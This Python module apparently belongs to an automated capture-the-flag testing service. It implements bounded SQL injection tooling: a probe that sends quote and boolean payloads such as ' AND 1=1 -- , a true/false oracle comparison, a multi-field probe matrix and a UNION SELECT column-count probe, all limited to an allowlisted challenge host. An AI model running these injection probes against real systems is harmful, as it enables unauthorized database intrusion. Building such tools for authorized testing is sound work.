"""Bounded SQL/oracle helpers using one transport-neutral RequestSpec."""

from __future__ import annotations

import hashlib
import json
from copy import deepcopy
from typing import Any
from urllib.parse import urlparse

from fastapi import HTTPException

from app.executors.http_executor import execute_http
from app.models import JobRequest

MAX_PROBE_REQUESTS = 40
MAX_ORACLE_SUBREQUESTS = 16
MAX_UNION_COLUMNS = 10


def _validate_target(request: JobRequest, endpoint: str) -> None:
    host = urlparse(endpoint).hostname
    if not host or host.lower() not in {item.lower() for item in request.allowed_hosts}:
        raise HTTPException(403, detail="SQL automation is restricted to the challenge host")


def _base_spec(args: dict[str, Any]) -> dict[str, Any]:
    raw = args.get("request") if isinstance(args.get("request"), dict) else args
    spec = deepcopy(raw)
    spec["url"] = str(spec.get("url") or spec.get("endpoint") or "")
    spec["method"] = str(spec.get("method") or ("POST" if spec.get("json") is not None or spec.get("form") is not None else "GET")).upper()
    spec["headers"] = dict(spec.get("headers") or {})
    spec.pop("request", None)
    return spec


def _put_field(spec: dict[str, Any], field: str, value: str) -> dict[str, Any]:
    result = deepcopy(spec)
    container = "json" if isinstance(result.get("json"), dict) else "form" if isinstance(result.get("form"), dict) else "query"
    payload = dict(result.get(container) or {})
    payload[field] = value
    result[container] = payload
    return result


async def _send(request: JobRequest, spec: dict[str, Any]) -> dict[str, Any]:
    url = str(spec.get("url") or "")
    if not url:
        raise HTTPException(422, detail="request.url is required")
    _validate_target(request, url)
    session_name = spec.pop("session_name", None) or spec.pop("cookie_ref", None)
    tool = "http_session_request" if session_name else "http_request"
    if session_name:
        spec["session_name"] = str(session_name)
    return await execute_http(request.model_copy(update={"tool": tool, "arguments": spec}))


def _signature(result: dict[str, Any]) -> dict[str, Any]:
    body = str(result.get("body") or result.get("body_excerpt") or "")
    parsed: dict[str, Any] = {}
    try:
        value = json.loads(body)
        if isinstance(value, dict):
            parsed = value
    except json.JSONDecodeError:
        pass
    return {
        "status_code": result.get("status_code"),
        "body_length": int(result.get("body_length") or len(body)),
        "response_hash": hashlib.sha256(body.encode(errors="replace")).hexdigest(),
        "matched": parsed.get("matched"),
        "message": parsed.get("message"),
        "field_names": sorted(parsed)[:50],
        "session_name": result.get("session_name"),
    }


def _observation(label: str, value: str, result: dict[str, Any]) -> dict[str, Any]:
    return {"label": label, "payload": value, "signature": _signature(result), "result": result}


def _extract_json_path(result: dict[str, Any], path: str) -> Any:
    body = str(result.get("body") or result.get("body_excerpt") or "")
    try:
        current: Any = json.loads(body)
    except json.JSONDecodeError:
        return None
    for part in str(path or "").split("."):
        if not part or not isinstance(current, dict) or part not in current:
            return None
        current = current[part]
    return current


def _conditions(args: dict[str, Any]) -> tuple[str, str]:
    return str(args.get("true_condition") or "' AND 1=1 -- "), str(args.get("false_condition") or "' AND 1=2 -- ")


async def _compare_field(request: JobRequest, args: dict[str, Any], field: str, true_value: str, false_value: str, repeats: int = 2) -> list[dict[str, Any]]:
    spec = _base_spec(args)
    control = dict(args.get("control_fields") or {})
    for name, value in control.items():
        spec = _put_field(spec, str(name), str(value))
    results: list[dict[str, Any]] = []
    for label, value in (("TRUE", true_value), ("FALSE", false_value)):
        for _ in range(repeats):
            result = await _send(request, _put_field(spec, field, value))
            results.append(_observation(f"{field}:{label}", value, result))
    return results


async def sql_injection_probe(request: JobRequest) -> dict:
    args = dict(request.arguments)
    field = str(args.get("test_field") or args.get("parameter") or "")
    spec = _base_spec(args)
    if not field or not spec.get("url"):
        raise HTTPException(422, detail="request.url and test_field are required")
    base_value = str(args.get("baseline_value") or "1")
    true_suffix, false_suffix = _conditions(args)
    values = [base_value, base_value + "'", base_value + true_suffix, base_value + false_suffix]
    max_requests = min(max(int(args.get("max_requests") or len(values)), 1), MAX_PROBE_REQUESTS)
    observations = []
    for value in values[:max_requests]:
        observations.append(_observation("probe", value, await _send(request, _put_field(spec, field, value))))
    signatures = [item["signature"] for item in observations]
    true_sig = next((item["signature"] for item in observations if item["payload"] == base_value + true_suffix), None)
    false_sig = next((item["signature"] for item in observations if item["payload"] == base_value + false_suffix), None)
    differential = bool(true_sig and false_sig and true_sig != false_sig)
    return {"status": "COMPLETED", "summary": "Bounded SQL injection probe completed", "structured_result": {
        "observations": observations,
        "method": spec["method"], "endpoint": spec["url"], "test_field": field,
        "boolean_differential": differential, "sql_syntax_signal": len({json.dumps(item, sort_keys=True) for item in signatures}) > 1,
        "sql_injection_confirmed": differential,
    }}


async def sql_boolean_compare(request: JobRequest) -> dict:
    args = dict(request.arguments)
    field = str(args.get("test_field") or args.get("parameter") or "")
    spec = _base_spec(args)
    if not field or not spec.get("url"):
        raise HTTPException(422, detail="request.url and test_field are required")
    oracle = dict(args.get("oracle") or {})
    json_field = str(oracle.get("json_field") or "").strip()
    if not json_field:
        raise HTTPException(422, detail="oracle.json_field is required")
    expected_true = oracle.get("true_value", True)
    expected_false = oracle.get("false_value", False)
    if int(args.get("max_requests") or 5) < 5:
        raise HTTPException(422, detail="TOOL_BUDGET_TOO_SMALL")
    for name, value in dict(args.get("control_fields") or {}).items():
        spec = _put_field(spec, str(name), str(value))
    base = str(args.get("baseline_value") or "")
    true_suffix, false_suffix = _conditions(args)
    observations = []
    for label, value in (("BASELINE", base), ("TRUE", base + true_suffix), ("FALSE", base + false_suffix)):
        for _ in range(2 if label != "BASELINE" else 1):
            observations.append(_observation(label, value, await _send(request, _put_field(spec, field, value))))
    true_rows = [item for item in observations if item["label"] == "TRUE"]
    false_rows = [item for item in observations if item["label"] == "FALSE"]
    true_values = [_extract_json_path(item["result"], json_field) for item in true_rows]
    false_values = [_extract_json_path(item["result"], json_field) for item in false_rows]
    for item in observations:
        item["oracle_value"] = _extract_json_path(item["result"], json_field)
    stable_true = len(true_values) == 2 and all(value == expected_true for value in true_values)
    stable_false = len(false_values) == 2 and all(value == expected_false for value in false_values)
    differential = stable_true and stable_false and expected_true != expected_false
    return {"status": "COMPLETED", "summary": "Boolean SQL differential completed", "structured_result": {
        "observations": observations, "method": spec["method"], "endpoint": spec["url"], "test_field": field,
        "control_fields": dict(args.get("control_fields") or {}),
        "oracle": {"json_field": json_field, "true_value": expected_true, "false_value": expected_false},
        "baseline": next((item for item in observations if item["label"] == "BASELINE"), {}),
        "true_results": true_rows, "false_results": false_rows,
        "stable_true": stable_true, "stable_false": stable_false,
        "true_false_differential": differential, "boolean_oracle_confirmed": differential,
        "sql_injection_confirmed": differential, "subrequest_count": len(observations),
    }}


async def oracle_probe_matrix(request: JobRequest) -> dict:
    args = dict(request.arguments)
    spec = _base_spec(args)
    fields = args.get("fields") or {}
    if not spec.get("url") or not isinstance(fields, dict) or not fields:
        raise HTTPException(422, detail="request.url and fields are required")
    control = dict(args.get("control_fields") or {})
    base_exists = str(args.get("baseline_exists") or "")
    base_absent = str(args.get("baseline_absent") or "")
    observations: list[dict[str, Any]] = []
    for label, value in (("baseline_exists", base_exists), ("baseline_absent", base_absent)):
        for _ in range(2):
            candidate = _put_field(spec, str(args.get("baseline_field") or next(iter(fields))), value)
            for name, fixed in control.items():
                candidate = _put_field(candidate, str(name), str(fixed))
            observations.append(_observation(label, value, await _send(request, candidate)))
    for field, config in fields.items():
        if not isinstance(config, dict):
            raise HTTPException(422, detail=f"fields.{field} must be an object")
        true_value = str(config.get("true_value") or config.get("true") or "")
        false_value = str(config.get("false_value") or config.get("false") or "")
        local_args = {**args, "control_fields": {**control, **dict(config.get("control_fields") or {})}}
        observations.extend(await _compare_field(request, local_args, str(field), true_value, false_value))
    if len(observations) > MAX_ORACLE_SUBREQUESTS:
        raise HTTPException(422, detail="oracle_probe_matrix exceeds max_subrequests=16")
    grouped: dict[str, list[dict]] = {}
    for item in observations:
        grouped.setdefault(item["label"], []).append(item["signature"])
    summary = {}
    for label, signatures in grouped.items():
        summary[label] = {"repeat_count": len(signatures), "stable": len({json.dumps(item, sort_keys=True) for item in signatures}) == 1, "signature": signatures[0]}
    return {"status": "COMPLETED", "summary": "Oracle probe matrix completed", "structured_result": {
        "method": spec["method"], "endpoint": spec["url"], "request_body": {key: value for key, value in spec.items() if key in {"json", "form", "query", "body"}},
        "observations": observations, "subrequest_count": len(observations), "summary_matrix": summary,
        "baseline_exists_confirmed": summary.get("baseline_exists", {}).get("stable", False),
        "baseline_absent_confirmed": summary.get("baseline_absent", {}).get("stable", False),
        "asset_field_tested": any(str(key) == "asset_no" for key in fields),
        "department_field_tested": any(str(key) == "department" for key in fields),
        "boolean_oracle_confirmed": any(item.get("stable") and label.endswith(":TRUE") for label, item in summary.items()) and any(item.get("stable") and label.endswith(":FALSE") for label, item in summary.items()),
    }}


async def sql_union_probe(request: JobRequest) -> dict:
    # UNION probing remains bounded and now accepts the same RequestSpec as the
    # boolean tools. It is intentionally not used by the warranty campaign.
    args = dict(request.arguments)
    field = str(args.get("test_field") or args.get("parameter") or "")
    spec = _base_spec(args)
    if not field or not spec.get("url"):
        raise HTTPException(422, detail="request.url and test_field are required")
    max_columns = min(max(int(args.get("max_columns") or 1), 1), MAX_UNION_COLUMNS)
    observations = []
    for columns in range(1, max_columns + 1):
        payload = str(args.get("baseline_value") or "1") + "' UNION SELECT " + ",".join(f"'ctfctl_{i}'" for i in range(columns)) + " -- "
        result = await _send(request, _put_field(spec, field, payload))
        body = str(result.get("body") or "")
        observations.append({"columns": columns, "payload": payload, "signature": _signature(result), "reflected_columns": [i for i in range(columns) if f"ctfctl_{i}" in body]})
    reflected = [item for item in observations if item["reflected_columns"]]
    return {"status": "COMPLETED", "summary": "Bounded UNION probe completed", "structured_result": {"observations": observations, "union_confirmed": bool(reflected), "column_count_candidates": [item["columns"] for item in reflected], "max_columns": max_columns, "max_requests": max_columns, "requests": len(observations), "full_database_extraction": False}}
